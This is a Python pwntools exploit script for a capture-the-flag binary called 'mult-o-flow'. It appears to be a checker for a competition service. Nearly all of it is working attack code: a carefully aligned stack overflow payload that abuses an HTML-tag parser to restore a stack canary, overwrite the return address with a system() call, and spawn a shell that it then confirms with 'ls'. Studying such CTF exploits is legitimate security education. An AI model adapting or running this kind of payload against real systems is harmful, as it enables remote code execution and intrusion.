#!/usr/bin/python2
# Author: Sceptic
# Packages: pip install pwntools
# Timeout: 120 Seconds
# Interval: 5 Minutes
# Host: flatearth.fluxfingers.net
# Port: 1746
# Files: ./mult-o-flow in cwd

from pwn import *
from struct import pack
import sys

interactive = False

binary = ELF("./mult-o-flow")

CANARY = "<td></td>"
TAGS = ["ISP:", "City:", "State/Region:", "Postal Code:", "Country:"]

ADDR_CMD_STR = binary.symbols["player"]
ADDR_STATUS_STRUCT = binary.symbols["state"]
CANARY_VAL = 0x00112233

ADDR_CALL_SYSTEM = binary.symbols["cmd"]
FIRSTBUFF_LEN = 4096
TMP_BUF_TO_CONTROL_LEN = 512 + 16 + 4

def payload_overflow():
	PAD = len(CANARY)*"D"
	
	# the first part of the payload writes the target cmd str address and a return address
	# token used later for the third override
	pl_mainbuf_override_stub = (
		p32(ADDR_CALL_SYSTEM+1)[:-1]+"<" # this serves as the closing tag for TAGS[4], which is a copy to 8 byte lower addresses
		+p32(ADDR_CMD_STR)[:3] # this is our command line string right at the end
	)
	
	# the first html parser override restores the cookie value
	# this payload aligns TAGS[4] to a buffer boundary between output_buf and tmp_buf so the TAGS[4] is destroyed
	# by a later override and found by the parser further down
	pl_first_html_parser_override_stub = (
		TAGS[0]+PAD+(512 - len(TAGS[4])-1)*"A" # calculate padding so that we align TAG[4] to tmp_buf[-1]
			# This is the first copying action which pushes TAGS[4] to the right alignment to do the 8 byte shift copy for the 
			# return pointer and also pushes TAGS[1] to tmp_buf after the first sprintf to out_buf
		+TAGS[4]+"A" # the correctly aligned TAGS[4] which makes copying start at tmp_buf[-1]+len(PAD) -> tmp_buf[8]
			# This is the Third copying which copies everything on the stack by 8 up the stack which pushed the return address to it's right spot
		+2*"B"+TAGS[1]+13*"D" # here we sneak another tag: TAGS[1], start of copying: tmp_buf[6]+len(TAGS[1])+len(PAD) = tmp_buf[2]+5+9=tmp_buf[16]. 
			# This is the second copying action and makes it so that the cookie value is shifted to the local cookie variabe
		+p32(0xdbdbdbdb)+4*"\x91" # saved base ptr and ret addr of html parser override
		+p32(CANARY_VAL)[:-1]+"<") # because of the alignment this closing tag serves as the stop for the first html parsing call and is converted to a null byte

	pl = TAGS[2]+PAD+"<" 
	# Concatenate whole payload:
	pl += (FIRSTBUFF_LEN -len(pl)+512-len(TAGS[0])-len(PAD))*"A"+ pl_first_html_parser_override_stub+pl_mainbuf_override_stub
	expected_pl_len = FIRSTBUFF_LEN+512+TMP_BUF_TO_CONTROL_LEN+20-1
	if len(pl)!=expected_pl_len:
		print("len(pl) = {}, expected: {}".format(len(pl), expected_pl_len))
		exit(-1)
	return pl
	
def exploit(r, host, port):
	r.recvuntil("> ")
	r.send("sh".ljust(64, "\x00"))
	r.recvline()
	r.send(payload_overflow())


if __name__ == "__main__":
	if len(sys.argv) >= 3:
		host = sys.argv[1]
		port = int(sys.argv[2])
	else:
		print("No payload in argv[1] specified, using default")
		host = "ubuntu"
		port = 4444 	

	MAX_TRIES = 5
	for _ in range(MAX_TRIES):
		try:
			with remote(host, port) as r:
			    exploit(r, host, port)
			    r.clean(1)
			    CHALL = "mult-o-flow"
			    if interactive:
			        r.interactive()
			    else:
			        r.sendline("ls")
			        answ = r.recvuntil(CHALL, timeout=2)
			        if CHALL in answ:
			            print("Success")
			            exit(0)
			        else:
			            print("Fail")
			            exit(-1)
		except EOFError:
			print("Got EOFError")

	print("Tries exhausted...")
	exit(-1)